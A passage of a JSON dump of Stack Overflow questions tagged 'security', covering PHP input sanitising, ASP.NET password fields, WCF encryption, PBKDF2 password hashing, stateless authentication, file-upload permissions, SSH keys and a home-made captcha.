href=\"http://www.php.net/manual/en/function.htmlspecialchars.php\" rel=\"nofollow\">htmlspecialchars</a>(). I thought at first that I could use strip_tags with something like:</p>\n\n<pre><code>&lt;?php $link_string = strip_tags($link_string, '&lt;a&gt;'); ?&gt;\n</code></pre>\n\n<p>But strip_tags doesn't protect me like htmlspecialchars does if I understand correctly. For example, incorrect HTML code using special characters can leave me vulnerable. And so can the style and onmouseover attributes for the link tag. </p>\n\n<p>What is the most <strong><em>simple</em></strong> solution to allow the above link in the post while cleaning out potentially harmful characters and code? Is there anyway I can combine these two PHP functions to do this in a <strong><em>simple</em></strong> manner? </p>\n"},{"tags":["asp.net-mvc","asp.net-mvc-3","security","passwords"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13179440,"title":"ASP.NET MVC3 HtmlPasswordFor how to make it not reset after post methods","body":"<p><br>\nEssentially I have a HtmlPasswordFor(m => EmployeeID), I have a button called \"Go\". Once I hit the Go textbox, I actually do not want the password to disappear on the or have the field password to be cleared. <br>\nHow would I do this?<br><br><br>\nBEFORE\n<img src=\"http://i.stack.imgur.com/vOzfF.png\" alt=\"enter image description here\">\n<br><br><br>\nAFTER\n<img src=\"http://i.stack.imgur.com/JggyK.png\" alt=\"enter image description here\"> \nI do not want the my employeeid to reset. I want to keep the passwords in <em>*</em>*'s, but I'll need the password on my next post call.\n<br><br></p>\n\n<h2>Controller</h2>\n\n<pre><code>    [HttpGet]\n    public ActionResult MainForm()\n    {\n        var model = new VTViewModel();\n        return View(model);\n    }\n\n    [HttpPost]\n    public ActionResult MainForm(VTViewModel model, string buttontype)\n    {\n        if (ModelState.IsValid)\n        {\n            string EmployeeID = (Convert.ToInt64(model.EmployeeBinaryID, 2)).ToString();\n            if (buttontype == \"Go\")\n            {\n                // GET Fields depending on the serial number.\n\n                model.ListFields = logic_model.getFormInfo(model.SerialNumber, EmployeeID);\n                if (model.ListFields[0].return_num == \"0\")\n                {\n                    model.Go = true;\n                    // Set Process\n                    // Set Header Token\n                    // Set Header Title\n\n                    ViewData[\"HEADER\"] = model.ListFields[0].HeaderName + \" | \" + model.ListFields[0].TubeType + \" | \" + model.ListFields[0].ProductLine;\n                }\n                else\n                {\n                    model.DisplayMessage = helper.checkErrors(model.ListFields[0].return_num);\n                }\n            }\n            else if (buttontype == \"Submit\")\n            {\n                model.HeaderToken = model.ListFields[0].HeaderToken; \n                string header = model.HeaderToken;\n                string check = \"\";                                                        \n                string return_num = model.ListFields[0].return_num; \n                // If the submission worked\n\n                //SUBMIT HERE INTO DB then Clear\n                List&lt;string&gt; values_to_submit = new List&lt;string&gt;(); // Creates a list to store the values to submit\n                for (int i = 0; i &lt; model.ListFields.Count; i++)\n                {\n                    // Fills in the hidden values.\n                    if (model.ListFields[i].isHidden)\n                    {\n                        if (model.ListFields[i].Token == \"SNT\" || model.ListFields[i].Token == \"SNC\")\n                        {\n                            model.ListFields[i].Value = model.SerialNumber;\n                        }\n                        else if (model.ListFields[i].Token == \"USR\")\n                        {\n                            model.ListFields[i].Value = EmployeeID;\n                        }\n                        else if (model.ListFields[i].Token == \"TMS\")\n                        {\n                            model.ListFields[i].Value = \"0\";\n                        }\n                    }\n\n                    // If it is a check box do the right conversion.\n                    if (model.ListFields[i].DataType == \"DATA-CKBOX\")\n                    {\n                        //string convertedValue = helper.trueFalseStringtToIntBool(model.ListFields[i].Value);\n                        string convertedValue = helper.boolToInt(model.ListFields[i].BoolValue).ToString();\n                        model.ListFields[i].Value = convertedValue;\n                    }\n\n                    values_to_submit.Add(model.ListFields[i].Token + model.ListFields[i].Value);\n\n                }\n\n                check = logic_model.helperSubmit(values_to_submit, header, 1);\n\n\n\n                if (check == \"Submitted\")\n                {\n                    ModelState.Clear();\n                    VTViewModel clear_model = new VTViewModel(); // Creates an empty model\n                    clear_model.DisplayMessage = \"Submitted\\n\" + model.SerialNumber + \"\\n\" + DateTime.Now;\n                    return View(clear_model);\n                }\n                else\n                {\n                    model.DisplayMessage = check; // Sets the display message to the error.\n                }\n\n            }\n            else if (buttontype == \"Clear\")\n            {\n                // Clears the screen and model\n                ModelState.Clear();\n                VTViewModel clear_model = new VTViewModel(); // Creates an empty model\n                return View(clear_model);\n            }\n        }\n        return View(model);\n\n    }\n</code></pre>\n\n<h2>View</h2>\n\n<pre><code>    div&gt;\n         &lt;fieldset&gt;\n         &lt;table id=\"main_table\"&gt;\n                &lt;tr&gt;\n                    &lt;td&gt;@Html.LabelFor(m =&gt; m.SerialNumber)&lt;/td&gt;\n                    &lt;td&gt;@Html.LabelFor(m =&gt; m.EmployeeBinaryID)&lt;/td&gt;\n                &lt;/tr&gt;\n                &lt;tr&gt;\n                    &lt;td&gt;@Html.TextBoxFor(m =&gt; m.SerialNumber)&lt;/td&gt;\n                    &lt;td&gt;@Html.PasswordFor(m =&gt; m.EmployeeBinaryID, new { autocomplete = \"off\" }) &lt;/td&gt;\n                &lt;/tr&gt;\n\n                &lt;tr&gt;&lt;td&gt;&lt;input type=\"submit\" value=\"Go\" name=\"buttontype\" class=\"submit_button\" id=\"btn\"/&gt;&lt;br /&gt;&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;\n         &lt;/table&gt;\n         &lt;/fieldset&gt;\n         &lt;br /&gt; \n</code></pre>\n\n<p><br><br>\nThanks</p>\n"},{"tags":["security","user","folders","subdomains","pages"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13168230,"title":"Security of website with user's pages: folders or subdomains?","body":"<p>The client wants to make the site (webservice, as he named it), where users can create their own pages, including  with JS scripts, etc. I see two ways - using the folders:</p>\n\n<pre><code>http://service.com/user/name/ ...\n</code></pre>\n\n<p>and subdomains:</p>\n\n<pre><code>http://user.service.com/...\n</code></pre>\n\n<p>Both paths are not the problem, but the client wants to make it using folders for SEO benefits.\nI think if I use folders, it will make the site less secure. For example, user can send AJAX request from its page and the server will respond him. If it was a sub-domain, in accordance with the SOP (Same Origin Policy) request would be rejected. Correct if I'm wrong.</p>\n\n<p>Is it real problem with SOP for folders?\nAre there any other security issues for folders?\nIs it safer to use subdomains?</p>\n"},{"tags":["wcf","security","networking","encryption"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":13177024,"title":"Add RSA based encryption to WCF service without certificates","body":"<p>I am looking for a way to encrypt messages between client and server using the WCF. WCF offers a lot of built in security mechanisms to enrcypt traffic between client and server, but there seems to be nothing fitting my requirements.</p>\n\n<p><strong>I don't want to use certificates</strong> since they are too complicated, so don't suggest me to to use certificates please. I don't need confidentiality, so I though I'll go best using plain RSA.</p>\n\n<p><strong>I want real security</strong>, no hardcoded key or something. I was thinking about having a public/private keypair generated every time the server starts. Both keys will only be stored in RAM.\nThen wen a client connects it should do exactly like SSL. Just as described <a href=\"http://stackoverflow.com/a/1571183/808723\">here</a>.</p>\n\n<blockquote>\n  <p>1.exchange some form of a private/public key pair; the server generates a key pair and keeps the private key to itself and shares the public key with the client (e.g. over a WCF message, for instance)</p>\n  \n  <p>2.using that private/public key pair, exchange a common shared secret, e.g. an \"encryption key\" that will symmetrically encrypt your messages (and since it's symmetrical, the server can use the same key to decrypt the messages)</p>\n  \n  <p>3.setup infrastructure on your client (e.g. a WCF extension called a behavior) to inspect the message before it goes out and encrypt it with your shared secret</p>\n</blockquote>\n\n<p>That would be secure, wouldn't it?</p>\n\n<p><strong>Is there any existing solution to archive what I described? If not I'll create it on my own. Where do I start best? Which kind of WCF custom behaviour is the best to implement?</strong></p>\n\n<hr>\n\n<p><strong>EDIT:</strong>\nAs this is NOT secure, I'll take the following approach:</p>\n\n<p>When Installing the server component a new X509 certificate will be generated and automatially added to the cert store (of the server). The public part of this generated certificate will be dynamically included into the client setup. When running the client setup on the client machine the certificate will be installed into the trustet windows certificate store of the client.</p>\n\n<p>So there's no extra work when installing the product and everything should be secure, just as we want it.</p>\n"},{"tags":["asp.net","security","asp.net-webforms","rijndaelmanaged"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":48,"score":0,"question_id":13177605,"title":"Asp.net code not working for implementing rijndael encryption, decryption?","body":"<p>I'm reading a book entitled beginning asp.net security from wrox and I'm in this part where it shows a code snippet for using rijndael the problem this example is not included in the downloadable source codes. I decided to seek (professional)help here in the forums.</p>\n\n<p>It would be awesome if you try and test it as well and hopefully give an example(codes) on how I could implement it.</p>\n\n<p>Here is the code:</p>\n\n<pre><code>public class EncryptionRijndael\n{\n        public EncryptionRijndael()\n        {\n                //\n                // TODO: Add constructor logic here\n                //\n        }\n\n    public static byte[] GenerateRandomBytes(int length)\n    {\n        byte[] key = new byte[length];\n        RNGCryptoServiceProvider provider = new RNGCryptoServiceProvider();\n        provider.GetBytes(key);\n        return key;\n    }\n\n    public void GetKeyAndIVFromPasswordAndSalt(string password, byte[] salt,SymmetricAlgorithm symmetricAlgorithm,ref byte[] key, ref byte[] iv)\n    {\n        Rfc2898DeriveBytes rfc2898DeriveBytes =\n        new Rfc2898DeriveBytes(password, salt);\n        key =\n        rfc2898DeriveBytes.GetBytes(symmetricAlgorithm.KeySize / 8);\n        iv =\n        rfc2898DeriveBytes.GetBytes(symmetricAlgorithm.BlockSize / 8);\n    }\n\n    public static byte[] Encrypt(byte[] clearText, byte[] key, byte[] iv)\n    {\n        // Create an instance of our encyrption algorithm.\n        RijndaelManaged rijndael = new RijndaelManaged();\n        // Create an encryptor using our key and IV\n        ICryptoTransform transform = rijndael.CreateEncryptor(key, iv);\n        // Create the streams for input and output\n        MemoryStream outputStream = new MemoryStream();\n        CryptoStream inputStream = new CryptoStream(\n        outputStream,\n        transform,\n        CryptoStreamMode.Write);\n        // Feed our data into the crypto stream.\n        inputStream.Write(clearText, 0, clearText.Length);\n        // Flush the crypto stream.\n        inputStream.FlushFinalBlock();\n        // And finally return our encrypted data.\n        return outputStream.ToArray();\n    }\n\n    static byte[] Decrypt(byte[] cipherText, byte[] key, byte[] iv)\n    {\n        // Create an instance of our encyrption algorithm.\n        RijndaelManaged rijndael = new RijndaelManaged();\n        // Create an decryptor using our key and IV ;\n        ICryptoTransform transform = rijndael.CreateDecryptor(key, iv);\n        // Create the streams for input and output\n        MemoryStream outputStream = new MemoryStream();\n        CryptoStream inputStream = new CryptoStream(outputStream,transform,CryptoStreamMode.Write);\n        // Feed our data into the crypto stream.\n        inputStream.Write(cipherText, 0, cipher.Length);\n        // Flush the crypto stream.\n        inputStream.FlushFinalBlock();\n        // And finally return our decrypted data.\n        return outputStream.ToArray();\n    }\n}\n</code></pre>\n\n<p>Sir/Ma'am your answers would be of great help. Thank you++\n(it would be awesome if you could show me how to call encrypt and decrypt properly)</p>\n"},{"tags":["php","security","authentication"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":13178316,"title":"PHP Stateless Authentication","body":"<p>I'm not new to PHP, but for authentication I've always used sessions. \nNow I'd like to make stateless authentication, so I can't use sessions, because there might be many server instances, and they won't share session data, so what I thought is have a session table on my database, and do the following:</p>\n\n<ul>\n<li>Store a cookie with a token in the client's machine</li>\n<li>Have a <em>token</em> column in the session table, something like a GUID, so all entries with the same token can be accessed by the client</li>\n<li>Also store the ip of the client, so people with the same token but different IP can't read the data</li>\n</ul>\n\n<p>Something like this</p>\n\n<pre><code>id   | token        | ip         | key       | data\n1    | a-guid       | 190.0.0.1  | username  | encrypted-data\n2    | a-guid       | 190.0.0.1  | is_logged | more-encrypted-data \n3    | other-guid   | 190.2.2.2  | is_logged | some-more-data\n</code></pre>\n\n<p>So the user with a cookie with token a-guid and ip 190.0.0.1 can access <em>username</em> and *is_logged* </p>\n\n<p>But I'm not sure about security, if someone could somehow get your token from your cookies, and your ip, and he/she could send a request with your cookie token and your ip, it would have complete access to your account.</p>\n\n<p>Should I have some special considerations?</p>\n"},{"tags":["php","security","htmlspecialchars","addslashes"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":36,"score":-1,"question_id":13177176,"title":"htmlspecialchars + addslashes, makes any sense?","body":"<p>I'm trying to sanitize a string to be saved in a db.\nFirst step I took was to use <code>addslashes()</code>, but then I realized it didn't solve many security issues, so I added <code>htmlspecialchars()</code>, and now I have this line of code:</p>\n\n<pre><code>$val=htmlspecialchars(addslashes(trim($val)));\n</code></pre>\n\n<p>But then I was wondering if it makes any sense at all to use <code>addslashes()</code> on a string that will be processed by <code>htmlspecialchars()</code>, since the latter will \"remove\" any element that would cause problems, if I'm not mistaken.</p>\n\n<p>In particular, I was wondering if that makes the server work twice without any real need.</p>\n"},{"tags":["asp.net","security","iis","file-upload","file-permissions"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":38,"score":3,"question_id":13169589,"title":"Web-enabled file storage and security implications of giving delete permission to IIS_IUSRS","body":"<p>I've had this question for many years, and did research every time that this issue arose, but could never find a definite answer. Somehow the mighty Internet, MSDN, community forums, are either silent or vague on this. Out of thousands of development-related uncertainties, this is the only one that remained elusive.</p>\n\n<p><strong>To the point:</strong> in order to enable users to upload and manage images (and other files) used in their blog posts, in a shared hosting environment, I can either consider SQL Server binary data types (performance implications), or the file system. To use the latter, the necessary permissions need to be set for the IIS_IUSRS role on the storage directory : create/write, read and delete. My question - if I do this, what are the security implications? Could someone somehow take advantage of this, bypass the ASP.NET request pipeline and manipulate the files inside the folder without making a request to the corresponding ASP.NET handler (which checks rights, validates uploads, etc.)?</p>\n\n<p>I've developed several systems that allowed file uploads and this has always bothered me. Now, hopefully, someone will be able to put my mind at ease and, ideally, explain the mechanics behind the process.</p>\n\n<hr>\n\n<p><strong>UPDATE</strong></p>\n\n<p>After viewing the latest answers (many thanks), another formulation of the question:</p>\n\n<p>Is it in any way possible for a client to somehow bypass the request pipeline and create/delete files inside a directory that allows it (assuming the person knows the directory structure)? Or only the code that handles the request can do it? Any potential exploits?</p>\n"},{"tags":["security","sharepoint2010"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3377,"score":1,"question_id":4130276,"title":"Why can't users in the \"Visitors\" group access my SharePoint 2010 publishing site. It works when i promote them to the \"Members\" group","body":"<p>When I place a test AD account in the Visitors group they are unable to view any pages on my new intranet site. The users receives the \"Error access denied\" sharepoint screen and indicates that the account was able to authenticate, but that some authorisation rule is permitting it from viewing the page.</p>\n\n<p>When i remove then and place them in the Members or Owners groups they are able to view the pages as well as perform the expected functions like editing content and creating subsites. </p>\n\n<p>Interesting, while in only the Visitors group, users can view the \"All Site Content\" page that is located here: /_layouts/viewlsts.aspx but not /pages/default.aspx.</p>\n\n<p>Has anyone experienced this before?</p>\n\n<p>Environment info: \n1 Web application, 1 Site collection using the Publishing Portal template. A few custom master pages, lots of custom page layouts and user controls. All deployed via features.\nSharepoint 2010 Standard edition, 64bit running on Windows Server 2008 against SqlServer 2008 Enterprise Edition. Authentication is against AD, not any other forms auth providers etc.</p>\n"},{"tags":["ruby","security","https","sinatra","rack"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13173543,"title":"Using https in Sinarta (Rack) application","body":"<p>I develop   a Sinatra app which lets users to login through some external web sites. One of those sites requires having 2 https pages on my Sinatra web site: Accept and Reject:</p>\n\n<pre><code>https://my_sinatra_app.com/external_login/site1/accept  \nhttps://my_sinatra_app.com/external_login/site1/reject\n</code></pre>\n\n<p>If an user enters valid login and password and clicks \"Agree\" on site1, they are going to be redirected to accept page on my web site, otherwise -- to reject one.</p>\n\n<p>Well, it's not so important. The question is, what do I have to do to use https in a Sinatra application? I need a very solution which allows me to use https on localhost and on a web hosting. Just to make my application work especially on localhost.</p>\n\n<p>Your thoughts?</p>\n"},{"tags":["security","cryptography","social-networking"],"answer_count":5,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":379,"score":3,"question_id":6725147,"title":"Considerations regarding a p2p social network","body":"<p>While the are many <strong>social networks</strong> in the wild, most rely on data stored on a central site owned by a third party.</p>\n\n<p>I'd like to build a solution, where <strong>data remains local on member's systems</strong>. Think of the project as an <strong>address book, which automagically updates</strong> contact's data as soon a a contact changes its coordinates. This base idea might get extended later on...</p>\n\n<p>Updates will be transferred using <strong>public/private key cryptography</strong> using a central host. The sole role of the <strong>host is to be a store and forward intermediate</strong>. Private keys remain private on each member's system.  </p>\n\n<p>If two client are both online and a <strong>p2p connection could be established</strong>, the clients could transfer data telegrams without the central host.</p>\n\n<p>Thus, <strong>sender and receiver</strong> will be the only parties which are able create <strong>authentic messages</strong>. </p>\n\n<p>Questions:</p>\n\n<ul>\n<li>Do exist certain protocols which I should adopt?</li>\n<li>Are there any security concerns I should keep in mind? </li>\n<li>Do exist certain services which should be integrated or used somehow?</li>\n</ul>\n\n<p>More technically:</p>\n\n<ul>\n<li>Use e.g. Amazon or Google provided services? </li>\n<li>Or better use a raw web-server? If yes: Why?</li>\n<li>Which algorithm and key length should be used?</li>\n</ul>\n\n<p><strong>UPDATE-1</strong></p>\n\n<p>I googled my own question title and found this academic project developed 2008/09: <a href=\"http://www.lifesocial.org/\" rel=\"nofollow\">http://www.lifesocial.org/</a>.</p>\n"},{"tags":["security","ntp","dmz"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":4,"score":0,"question_id":13173163,"title":"should the NTP server reside in DMZ? what are the security concerns?","body":"<p>should the NTP server reside in DMZ? what are the security concerns?  i am doing network architecture security review.</p>\n"},{"tags":["c#","string","security","xss"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":101,"score":2,"question_id":7822079,"title":"How to Secure a string from UserInput","body":"<p>We have a Website where a user can reject something from another user with a reason. The reason is sent to the other user via email.</p>\n\n<p>What characters can be sent to the other user?\nI am not going to do a regex search for unwanted characters but rather only want to keep \"potentially\" \"safe\" characters in the reason.</p>\n\n<p>For example the reason:</p>\n\n<pre><code>\"Hello &lt;b&gt;Dear User B\"\n</code></pre>\n\n<p>Would be transformed to:</p>\n\n<pre><code>\"Hello bDear User B\"\n</code></pre>\n\n<p>Currently i'm just doing a \"Where\" on the char array and define my \"safe\" conditions via</p>\n\n<pre><code>char.IsLetterOrDigit || char.IsPunctuation || char.IsWhiteSpace\n</code></pre>\n\n<p>Are there any better techniques?</p>\n"},{"tags":["asp.net","database","security","hash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13172185,"title":"Should I store (password with salt) in the database or hashed password and salt as two different fields in the database?","body":"<p>I would like to ask if this hashing technique is good enough for asp.net?</p>\n\n<p>I plan to save the hashed password in a single field called 'password' and then hash the user input password on the login page and see if it matches</p>\n\n<p>Here is the code:</p>\n\n<pre><code>public const int SALT_BYTES = 24;\n    public const int HASH_BYTES = 24;\n    public const int PBKDF2_ITERATIONS = 1000;\n\n    public const int ITERATION_INDEX = 0;\n    public const int SALT_INDEX = 1;\n    public const int PBKDF2_INDEX = 2;\n\n    /// &lt;summary&gt;\n    /// Creates a salted PBKDF2 hash of the password.\n    /// &lt;/summary&gt;\n    /// &lt;param name=\"password\"&gt;The password to hash.&lt;/param&gt;\n    /// &lt;returns&gt;The hash of the password.&lt;/returns&gt;\n    public static string CreateHash(string password)\n    {\n        // Generate a random salt\n        RNGCryptoServiceProvider csprng = new RNGCryptoServiceProvider();\n        byte[] salt = new byte[SALT_BYTES];\n        csprng.GetBytes(salt);\n\n        // Hash the password and encode the parameters\n        byte[] hash = PBKDF2(password, salt, PBKDF2_ITERATIONS, HASH_BYTES);\n        return PBKDF2_ITERATIONS + \":\" +\n           Convert.ToBase64String(salt) + \":\" +\n           Convert.ToBase64String(hash);\n    }\n\n    /// &lt;summary&gt;\n    /// Validates a password given a hash of the correct one.\n    /// &lt;/summary&gt;\n    /// &lt;param name=\"password\"&gt;The password to check.&lt;/param&gt;\n    /// &lt;param name=\"goodHash\"&gt;A hash of the correct password.&lt;/param&gt;\n    /// &lt;returns&gt;True if the password is correct. False otherwise.&lt;/returns&gt;\n    public static bool ValidatePassword(string password, string goodHash)\n    {\n        // Extract the parameters from the hash\n        char[] delimiter = { ':' };\n        string[] split = goodHash.Split(delimiter);\n        int iterations = Int32.Parse(split[ITERATION_INDEX]);\n        byte[] salt = Convert.FromBase64String(split[SALT_INDEX]);\n        byte[] hash = Convert.FromBase64String(split[PBKDF2_INDEX]);\n\n        byte[] testHash = PBKDF2(password, salt, iterations, hash.Length);\n        return SlowEquals(hash, testHash);\n    }\n\n    /// &lt;summary&gt;\n    /// Compares two byte arrays in length-constant time. This comparison\n    /// method is used so that password hashes cannot be extracted from \n    /// on-line systems using a timing attack and then attacked off-line.\n    /// &lt;/summary&gt;\n    /// &lt;param name=\"a\"&gt;The first byte array.&lt;/param&gt;\n    /// &lt;param name=\"b\"&gt;The second byte array.&lt;/param&gt;\n    /// &lt;returns&gt;True if both byte arrays are equal. False otherwise.&lt;/returns&gt;\n    private static bool SlowEquals(byte[] a, byte[] b)\n    {\n        uint diff = (uint)a.Length ^ (uint)b.Length;\n        for (int i = 0; i &lt; a.Length &amp;&amp; i &lt; b.Length; i++)\n            diff |= (uint)(a[i] ^ b[i]);\n        return diff == 0;\n    }\n\n    /// &lt;summary&gt;\n    /// Computes the PBKDF2-SHA1 hash of a password.\n    /// &lt;/summary&gt;\n    /// &lt;param name=\"password\"&gt;The password to hash.&lt;/param&gt;\n    /// &lt;param name=\"salt\"&gt;The salt.&lt;/param&gt;\n    /// &lt;param name=\"iterations\"&gt;The PBKDF2 iteration count.&lt;/param&gt;\n    /// &lt;param name=\"outputBytes\"&gt;The length of the hash to generate, in bytes.&lt;/param&gt;\n    /// &lt;returns&gt;A hash of the password.&lt;/returns&gt;\n    private static byte[] PBKDF2(string password, byte[] salt, int iterations, int outputBytes)\n    {\n        Rfc2898DeriveBytes pbkdf2 = new Rfc2898DeriveBytes(password, salt);\n\n        pbkdf2.IterationCount = iterations;\n        return pbkdf2.GetBytes(outputBytes);\n    }\n</code></pre>\n\n<p>If there are ways I can I improve this it would be awesome if you could point out certain codes that I could replace.</p>\n\n<p>The code is from: <a href=\"http://crackstation.net/hashing-security.htm#aspsourcecode\" rel=\"nofollow\">http://crackstation.net/hashing-security.htm#aspsourcecode</a></p>\n\n<p>Sir/Ma'am Thank you++ :D</p>\n"},{"tags":["security","ssh","ssh-keys"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13172607,"title":"How to setup server to accept pem(private RSA key) login w/o password like EC2?","body":"<p>I am manage a group of VM and I need to setup all vm create a ssh tunnel to a specific host A. One way to do this is append public key of each VM to host's authorized_keys, but I guess I have to do the append each time i create a VM. So I am trying to config host A to accept pem or private key login without passowrd, just like EC2, client can use \"ssh -i PEM\" to login host A. \nBut I have tried in vain for hours. I create a rsa public/private key and let VM use the private key to login, no matter what I do, host a still ask for password. Is there anything I missed ? Thanks.</p>\n"},{"tags":["javascript","security","authentication","cross-domain"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":13172223,"title":"Client-side Javascript Authentication Scheme","body":"<p>Assume you have 2 servers on 2 separate sub-domains called client.example.com and server.example.com, is it possible to authenticate a user using only client side-javascript on client.example.com (no server-side component) and only server-side code (restful json api only)?</p>\n\n<p>A good practical example of this would be to create a client-side only twitter component that does things like post tweets which require authentication. (Right now twitter will open another window which uses their domain for the browser to send the appropriate cookies with the session_id, but assuming we can change that).</p>\n"},{"tags":["wcf","security","webclient","webhttpbinding"],"answer_count":2,"favorite_count":4,"up_vote_count":3,"down_vote_count":0,"view_count":7069,"score":3,"question_id":795717,"title":"How do you pass user credentials from WebClient to a WCF REST service?","body":"<p>I am trying to expose a WCT REST service and only users with valid username and password would be able to access it. The username and password are stored in a SQL database. </p>\n\n<p>Here is the service contract:</p>\n\n<pre><code>public interface IDataService\n{\n    [OperationContract]\n    [WebGet(ResponseFormat = WebMessageFormat.Json)]\n    byte[] GetData(double startTime, double endTime);\n}\n</code></pre>\n\n<p>Here is the WCF configuration:</p>\n\n<pre><code>&lt;bindings&gt;\n  &lt;webHttpBinding&gt;\n    &lt;binding name=\"SecureBinding\"&gt;\n      &lt;security mode=\"Transport\"&gt;\n        &lt;transport clientCredentialType=\"Basic\"/&gt;\n      &lt;/security&gt;\n    &lt;/binding&gt;\n  &lt;/webHttpBinding&gt;\n&lt;/bindings&gt;\n&lt;behaviors&gt;\n  &lt;serviceBehaviors&gt;\n    &lt;behavior name=\"DataServiceBehavior\"&gt;\n      &lt;serviceMetadata httpGetEnabled=\"true\"/&gt;\n      &lt;serviceCredentials&gt;\n        &lt;userNameAuthentication\n           userNamePasswordValidationMode=\"Custom\"\n           customUserNamePasswordValidatorType=\n                 \"CustomValidator, WCFHost\" /&gt;\n      &lt;/serviceCredentials&gt;\n    &lt;/behavior&gt;\n  &lt;/serviceBehaviors&gt;\n&lt;/behaviors&gt;\n&lt;services&gt;\n  &lt;service behaviorConfiguration=\"DataServiceBehavior\" name=\"DataService\"&gt;\n    &lt;endpoint address=\"\" binding=\"webHttpBinding\"\n              bindingConfiguration=\"SecureBinding\" contract=\"IDataService\" /&gt;\n  &lt;/service&gt;\n&lt;/services&gt;\n</code></pre>\n\n<p>I am accessing the service via the WebClient class within a Silverlight application. However, I have not been able to figure out how to pass the user credentials to the service. I tried various values for client.Credentials but none of them seems to trigger the code in my custom validator. I am getting the following error: The underlying connection was closed: An unexpected error occurred on a send.</p>\n\n<p>Here is some sample code I have tried:</p>\n\n<pre><code>   WebClient client = new WebClient();\n   client.Credentials = new NetworkCredential(\"name\", \"password\", \"domain\");\n   client.OpenReadCompleted += new OpenReadCompletedEventHandler(GetData);\n   client.OpenReadAsync(new Uri(uriString));\n</code></pre>\n\n<p>If I set the security mode to None, the whole thing works. I also tried other clientCredentialType values and none of them worked. I also self-hosted the WCF service to eliminate the issues related to IIS trying to authenticate a user before the service gets a chance.</p>\n\n<p>Any comment on what the underlying issues may be would be much appreciated. Thanks.</p>\n\n<p><strong>Update</strong>: Thanks to Mehmet's excellent suggestions. Here is the tracing configuration I had:</p>\n\n<pre><code> &lt;system.diagnostics&gt;\n    &lt;sources&gt;\n      &lt;source name=\"System.ServiceModel\"\n              switchValue=\"Information, ActivityTracing\"\n              propagateActivity=\"true\"&gt;\n        &lt;listeners&gt;\n          &lt;add name=\"xml\" /&gt;\n        &lt;/listeners&gt;\n      &lt;/source&gt;\n      &lt;source name=\"System.IdentityModel\" switchValue=\"Information, \n               ActivityTracing\" propagateActivity=\"true\"&gt;\n        &lt;listeners&gt;\n          &lt;add name=\"xml\" /&gt;\n        &lt;/listeners&gt;\n      &lt;/source&gt;\n    &lt;/sources&gt;\n    &lt;sharedListeners&gt;\n      &lt;add name=\"xml\"\n           type=\"System.Diagnostics.XmlWriterTraceListener\"\n           initializeData=\"c:\\Traces.svclog\" /&gt;\n    &lt;/sharedListeners&gt;\n  &lt;/system.diagnostics&gt;\n</code></pre>\n\n<p>But I did not see any message coming from my Silverlight client. As for https vs http, I used https as follows:</p>\n\n<pre><code>string baseAddress = \"https://localhost:6600/\";\n_webServiceHost = new WebServiceHost(typeof(DataServices), \n                new Uri(baseAddress));\n_webServiceHost.Open();\n</code></pre>\n\n<p>However, I did not configure any SSL certificate. Is this the problem?</p>\n"},{"tags":["security","mobile","jquery-mobile","web","web-development"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13171300,"title":"What Are the standards in mobile web application development?","body":"<p>I am working as a developer of a mobile team. Up to now, we have developed many navite mobile applications on windows mobile and android platforms. Our branch has groved up for the last 2 years and we have not many employees to work with. So we found a solution that covers platform-free application development. So, we will make it possible with a web based mobile application. WCF HTTP services, logging side, database, ssl certificate etc. are ready for this. My questions:</p>\n\n<ol>\n<li>what are the <strong>basics</strong> of a mobile web application for security. </li>\n<li>Is it possible to take mobile browser support that runs <strong>HTML5</strong> on any A-B-C generation mobile phones ? </li>\n<li>jquery libraries for mobile (jquery mobile etc.) are secure enough for this?</li>\n</ol>\n"},{"tags":["c#","winforms","security","cookies","webbrowser-control"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13169955,"title":"How can I stop a webbrowser control from showing cookie security warnings?","body":"<p>I'm using <code>winform</code> <code>webbrowser</code> control and sometimes when closing the application, I get this very annoying Windows Security Warning dialog about allowing cookies on the site. Here is the exact message:</p>\n\n<blockquote>\n  <p>To allow this website to provide information personalized for you,\n  will you allow it to put a small file (called a cookie) on your\n  computer?</p>\n</blockquote>\n\n<p>Now, I know my IE 9 settings has cookies turned on (by navigating my control to www.whatismybrowser.com), so why do I still get this dialog? I would like it to never display, and I thought allowing cookies should be sufficient but maybe the control is doing something else. </p>\n"},{"tags":["php","security","captcha","brute-force"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":101,"score":3,"question_id":13167832,"title":"Home made captcha , is it safe?","body":"<p>I've been gathering information about how to protect from <em>brut force attack</em> on the logging page or from the haressment of <em>multiple account creation.</em></p>\n\n<p>I came to the conclusion (thanks to you guys of Stackoverflow)  that the best way would be to use captchas.</p>\n\n<p>But uneasy to read captchas or accented characters may deter users from using a website.</p>\n\n<p>So, I found out an easy to use little script I adapted to my site. It's a simple math captcha proposing to sum up 2 figures from <em>zero to ten</em>. It displays the words <strong>'one' 'two' 'three'</strong> ... not the figures.  </p>\n\n<p>My questions are :</p>\n\n<p>1) Does this little captcha provide sufficient security in itself ?</p>\n\n<p>2) Is the way I integrated it 